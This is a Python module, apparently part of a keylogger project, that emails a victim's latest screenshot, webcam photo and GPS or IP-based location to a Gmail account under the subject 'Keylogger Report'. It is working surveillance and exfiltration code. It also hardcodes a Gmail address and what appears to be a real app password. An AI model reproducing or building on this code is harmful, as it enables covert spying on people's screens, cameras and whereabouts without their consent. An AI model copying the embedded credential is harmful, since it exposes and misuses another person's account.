import smtplib
import os
from email.message import EmailMessage
from utils.geolocation import get_location  # fallback if GPS not provided

# 🔐 Set your Gmail credentials here
EMAIL_ADDRESS = "kpunithnaik25@gmail.com"
EMAIL_PASSWORD = "jssg nqkk nsqe tqfd"  # Use 16-digit Gmail app password

def send_data_to_email(screenshot_folder, webcam_folder, location_info=None):
    try:
        # Get latest screenshot and webcam files
        screenshot = sorted(os.listdir(screenshot_folder))[-1]
        webcam = sorted(os.listdir(webcam_folder))[-1]

        screenshot_path = os.path.join(screenshot_folder, screenshot)
        webcam_path = os.path.join(webcam_folder, webcam)

        # 📤 Compose email
        msg = EmailMessage()
        msg["Subject"] = "🔐 Keylogger Report"
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS

        # 📍 Use passed-in GPS location or fallback to IP-based
        location_text = location_info if location_info else get_location()

        msg.set_content(f"""
        Here is the latest keylogger snapshot.

        📍 Location Info:
        {location_text}
        """)

        # Attach Screenshot
        with open(screenshot_path, "rb") as f:
            msg.add_attachment(f.read(), maintype="image", subtype="png", filename=screenshot)

        # Attach Webcam Image
        with open(webcam_path, "rb") as f:
            msg.add_attachment(f.read(), maintype="image", subtype="png", filename=webcam)

        # Send Email
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)

        print("[✔] Email sent successfully.")

    except Exception as e:
        print(f"[❌] Failed to send email: {e}")
